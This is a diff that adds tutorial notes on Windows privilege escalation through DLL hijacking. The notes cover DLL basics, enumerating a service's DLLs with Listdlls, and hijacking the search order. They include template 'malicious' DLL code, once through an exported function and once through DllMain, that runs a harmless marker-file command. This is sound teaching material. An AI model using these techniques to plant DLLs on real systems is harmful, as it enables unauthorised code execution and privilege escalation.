@@ -1,0 +1,235 @@
+                     ______________________________
+
+                      WINDOWS PRIVILEGE ESCALATION
+                             DLL Hijacking
+
+                            Leonardo Tamiano
+                     ______________________________
+
+
+Table of Contents
+_________________
+
+1. Dynamic Link Libraries (DLL)
+2. A Simple Example
+3. Service DLL Enumeration
+4. Overwriting DLL Binaries
+5. Hijacking DLL Search Order
+6. References
+
+
+1 Dynamic Link Libraries (DLL)
+==============================
+
+  Modern operating system offers the ability to reuse common code such
+  as libraries across binaries. When an executable is started, a linker
+  loads these `dynamic libraries' into the process memory.
+
+  - In Linux, these libraries are called `shared objects' (.so)
+
+  - In Windows, these libraries are called `Dynamic Link Libraries'
+    (.dll)
+
+  Since this loading process happens dynamically upon execution, this
+  introduces the possibility for an attacker to inject malicious code in
+  the form of a `malicious DLL that is loaded into the process memory'.
+
+  There are two possible ways to attack the DLL surface area:
+
+  1. Find a DLL used by the victim binary that the attacker can
+     overwrite with a malicious DLL.
+
+  2. Introduce a new malicious DLL and trick the default search order
+     used by Windows in order to load the malicious code instead of the
+     original one.
+
+
+2 A Simple Example
+==================
+
+  Let us see how to create a binary that depends on a shared library.
+
+  First, we compile the library code itself. This is the code that will
+  be used by our main application.
+
+  `lib.c'
+  ,----
+  | #include <windows.h>
+  | 
+  | __declspec(dllexport) int add_numbers(int a, int b) {
+  |     return a + b;
+  | }
+  `----
+
+  We can compile it as follows. Notice the `-shared' flag to tell the
+  compiler to produce a `DLL' instead of an `executable'.
+
+  ,----
+  | x86_64-w64-mingw32-gcc -shared -o lib.dll lib.c
+  `----
+
+  Then, we can use the library as follows
+
+  `main.c'
+  ,----
+  | #include <stdio.h>
+  | #include <windows.h>
+  | 
+  | typedef int (*AddNumbersFunc)(int, int);
+  | 
+  | int main() {
+  |     HINSTANCE hinstLib;
+  |     AddNumbersFunc addNumbers;
+  |     BOOL fFreeResult;
+  |     int result;
+  | 
+  |     // Load the DLL
+  |     hinstLib = LoadLibrary(TEXT("lib.dll"));
+  |     if (hinstLib == NULL) {
+  |         printf("Could not load the DLL\n");
+  |         return 1;
+  |     }
+  | 
+  |     // Get function pointer
+  |     addNumbers = (AddNumbersFunc)GetProcAddress(hinstLib, "add_numbers");
+  |     if (addNumbers == NULL) {
+  |         printf("Could not find the function in the DLL\n");
+  |         FreeLibrary(hinstLib);
+  |         return 1;
+  |     }
+  | 
+  |     // Call the function
+  |     result = addNumbers(5, 10);
+  |     printf("Result of add_numbers(5, 10): %d\n", result);
+  | 
+  |     // Free the DLL module
+  |     fFreeResult = FreeLibrary(hinstLib);
+  | 
+  |     return 0;
+  | }
+  `----
+
+  We can compile this as follows
+  ,----
+  | x86_64-w64-mingw32-gcc -o main.exe main.c
+  `----
+
+
+3 Service DLL Enumeration
+=========================
+
+  To understand the DLL of a given service we can use the
+  `Listddls64.exe', which works for currently executing `processes'.
+
+  ,----
+  | C:\Users\Quickemu\Downloads>.\Listdlls64.exe /accepteula simpleService
+  | 
+  | Listdlls v3.2 - Listdlls
+  | Copyright (C) 1997-2016 Mark Russinovich
+  | Sysinternals
+  | 
+  | ------------------------------------------------------------------------------
+  | simpleService.exe pid: 4004
+  | Command line: "C:\Users\Quickemu\Downloads\Example Directory\Another Directory\simpleService.exe"
+  | 
+  | Base                Size      Path
+  | 0x00000000a0140000  0x12000   C:\Users\Quickemu\Downloads\Example Directory\Another Directory\simpleService.exe
+  | 0x00000000c2ad0000  0x217000  C:\Windows\SYSTEM32\ntdll.dll
+  | 0x00000000c2550000  0xc4000   C:\Windows\System32\KERNEL32.DLL
+  | 0x00000000c0380000  0x3ad000  C:\Windows\System32\KERNELBASE.dll
+  | 0x00000000c12a0000  0xb2000   C:\Windows\System32\ADVAPI32.dll
+  | 0x00000000c2650000  0xa7000   C:\Windows\System32\msvcrt.dll
+  | 0x00000000c13b0000  0xa9000   C:\Windows\System32\sechost.dll
+  | 0x00000000c07a0000  0x28000   C:\Windows\System32\bcrypt.dll
+  | 0x00000000c2170000  0x114000  C:\Windows\System32\RPCRT4.dll
+  `----
+
+
+4 Overwriting DLL Binaries
+==========================
+
+  Once we know the paths of the DLLs used by a given service binary, we
+  can check if we have the permissions to ovewrite them to load a
+  malicious DLL.
+
+  `malicious-lib.c'
+  ,----
+  | #include <windows.h>
+  | #include <stdlib.h>
+  | 
+  | __declspec(dllexport) int add_numbers(int a, int b) {
+  |   system("echo 'hacks' > C:\\Users\\Quickemu\\Downloads\\HACKED");
+  |   return a + b;
+  | }
+  `----
+
+  ,----
+  | x86_64-w64-mingw32-gcc -shared -o malicious-lib.dll malicious-lib.c
+  `----
+
+  If we're able to overwrite the original DLL with the malicious one,
+  then the malicious code will execute everytime the original program
+  executes.
+
+  ----------------------------------------------------------------------
+
+  In general, if you do not know which functions are exported by the
+  DLL, you can just use the `DllMain' to introduce malicious code.
+
+  ,----
+  | BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
+  |   system("echo 'hacks' > C:\\Users\\Quickemu\\Downloads\\HACKED");
+  |   return TRUE;
+  | }
+  `----
+
+  This approach however can bring visible changes to the external
+  behavior of the program, and in general it is not a very stealth
+  approach.
+
+
+5 Hijacking DLL Search Order
+============================
+
+  If you do not specify a full path when loading a DLL, when Microsoft
+  tried to find a DLL, a specific search order is followed.
+
+  - Absolute Path
+  ,----
+  | hinstLib = LoadLibrary(TEXT("C:\\Users\\Quickemu\\Downloads\\lib.dll"));
+  `----
+
+  - Relative Path
+    ,----
+    | hinstLib = LoadLibrary(TEXT("lib.dll"));
+    `----
+
+  The specific search order is the following one
+
+  1. The folder specified by `lpFileName'
+  2. System folder, get using `GetSystemDirectory()'
+  3. 16-bit system folder
+  4. Windows directory, get using `GetWindowsDirectory()'
+  5. Current directory
+  6. Directories listed in the `PATH'
+
+  In this case we have a problem when the attacker is able to introduce
+  a malicious DLL in a position that has priority over the regular
+  DLL. For example:
+
+  - The regular DLL is found within the Windows Directory (C:\Windows)
+  - The malicious DLL is found within the System Folder
+    (C:\Windows\System32)
+
+
+6 References
+============
+
+  ListDLLs is a utility that reports the DLLs loaded into processes.
+  <https://learn.microsoft.com/en-us/sysinternals/downloads/listdlls>
+
+  Compiling a DLL using MingGW
+  <https://malicious.link/posts/2020/compiling-a-dll-using-mingw/>
+
+  Dynamic-link library search order
+  <https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order>
